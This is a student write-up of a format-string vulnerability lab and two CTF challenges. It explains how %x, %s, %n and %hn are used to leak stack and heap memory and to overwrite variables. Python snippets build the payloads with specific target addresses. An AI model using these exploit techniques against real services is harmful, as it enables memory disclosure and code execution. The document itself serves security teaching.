# Trabalho realizado na Semana #7

## Task 1

In order to crash the program we have to simply use the `badfile` created by the `build_string.py` script that is provided by the `build_string.py`.
This happens because in this file the string `"%.8x"*12 + "%n"` attempts to save the number of characters that come before %n in a variable.
Since none is provided in the file, it will write in forbidden memory area.


## Task 2

### Task 2.A

We can exploit the `printf` call in the program by providing a string with `%x` format specifiers.
Upon encountering a format character, the formatter will try to look for provided variables. 
Because none are given in the program it will traverse the stack and print whatever comes next.

Since the contents of the buffer will be somewhere in the stack, we can use the format string to traverse the stack until it reaches our input.
For that we used a string of the form `"????" + "%.8x\n"*n`, where n was guessed by locating the `"????"` in the server output.
After multiple attempts, we reached the value `n=64`, thus finding the buffer position in the stack.

### Task 2.B

The goal here was to print the contents of a certain address of heap memory.
Because we already know the position of our input in the stack, we can use this to print the desired information.
To do this, we replaced the first bytes of the input with the intended address and traversed the stack until it reached the buffer.
There we used a `%s` format specifier to print the memory contents.

```python
#The secret message's address
content[0:4]  =  (0x080b4008).to_bytes(4, byteorder='little') 

#Traverse the stack
s = "%.8x\n"*63

#Print the contents in memory
s += "%s"

fmt  = (s).encode('latin-1')
content[4:4+len(fmt)] = fmt
```

## Task 3

### Task 3.A

To write data to a given address, one can follow the logic described above.
Instead of printing the contents with `%s`, `%n` is used to write to the variable.
By giving the desired address and traversing the stack, an integer value will be written to memory and its value is determined by the amount of bytes writen by the format string so far.

```bash
server-10.9.0.5 | The target variable s value (before): 0x11223344
server-10.9.0.5 | h112233440000100008049db5080e5320080e61c0ffffd540ffffd468080e62d4080e5000ffffd50808049f7effffd540000000000000006408049f47080e5320000005dc000005dcffffd540ffffd540080e972000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000dbcd2f00080e5000080e5000ffffdb2808049effffffd540000005dc000005dc080e5320000000000000000000000000ffffdbf4000000000000000000000000000005dc
server-10.9.0.5 | The target variable s value (after):  0x000001fd
server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)

```

### Task 3.B

The number written by the `%n` is dependent of the format string. 
Because we control the format string we can use it to write arbitrary integer values to memory.
By using placeholders like `%.10x` we can control said values. This one in particular would increase the value to be written by 10.

Thus, to write the desired `0x5000` value we just need to calculate the value of k in `%.kx`.
This is done with the following equation:

``` 
0x5000 = address_bytes + %x used to traverse the string + k
<=> 0x5000 = 4 + 8 * 62 + 1 + k
<=> k = 19980
```

After getting this value, we just need to construct the string:

```python
content[0:4]  =  (0x080e5068).to_bytes(4, byteorder='little')
s = "%.8x"*62 + "%.19980x"
s += "%n"

fmt  = (s).encode('latin-1')
content[4:4+len(fmt)] = fmt
```

### Task 3.C

If we wanted to write a larger number using the process of the last task, it would take a considerable amount of time.
Thus, it is not viable to do it the same way.
Instead, we can take advantage of the `%hn` formaters, which write 2 instead of 4 bytes.

The calculations can be done in a similar form to the task above. 
After those are perfomed we end up with the following result:

```py
content[0:4]  =  (0x080e506a).to_bytes(4, byteorder='little')
content[4:8]  =  ("????").encode('latin-1')
content[8:12]  =  (0x080e5068).to_bytes(4, byteorder='little')

s = "%.8x"*62 + "%.43199x%hn" + "%.8738x%hn"

fmt  = (s).encode('latin-1')
content[12:12+len(fmt)] = fmt
```

Note that instead of writing a huge number to the address in memory, we simply write two smaller ones and divide them across the address.

# Week 7 CTF

## Challenge 1

For this challenge, the source code of a program was available.
There, we noticed a flag was being stored as a global variable.
Furthermore, we encountered a vulnerability in the program:

```c
printf(buffer)
```

This meant that we could supply a malicious format string to get to the flag.
First, the `gdb` was used to find out the address of the flag:

```bash
gdb-peda$ info address flag
Symbol "flag" is static storage at address 0x804c060.
```

Then, we needed to find out where our input was being stored in the stack. Therefore, we used the following string to display the contents of the stack:

```python
s = "????" + "%.8x\n"*63
```

Because the ouput was `????3f3f3f3f` and `3f` is `"?"` in hex, we knew that the buffer was in the first position of the stack.
With all this information, it was easy to extract the flag:

```python
c = (0x0804c060).to_bytes(4, byteorder='little') 
s = "%s"
fmt = (s).encode('latin-1')
c += fmt
```

## Challenge 2

This time, the flag was not being loaded into memory.
Instead, a global variable `key` was being used to verify access to a 'backdoor'.
If it was equal to `0xbeef`, a bash program would be loaded.
Therefore, we had to modify the key variable in order to gain access to the flag.

This can be done with a similar process to the one in the first task.
The variable address was discovered in the same fashion:

```bash
gdb-peda$ info address key
Symbol "key" is static storage at address 0x804c034.
```

Then, we verified that the buffer was located in the same place in the stack.
After that, we needed to use `%n` to overwrite the value in memory.
The value of bytes to be written would be equal to `0xbeef - 8`.

```python
c = (0xaaaabbbb).to_bytes(4, byteorder='little') #placeholder
c += (0x0804c034).to_bytes(4, byteorder='little') 
s = "%.48871x" + "%n"

fmt = (s).encode('latin-1')
c += fmt
```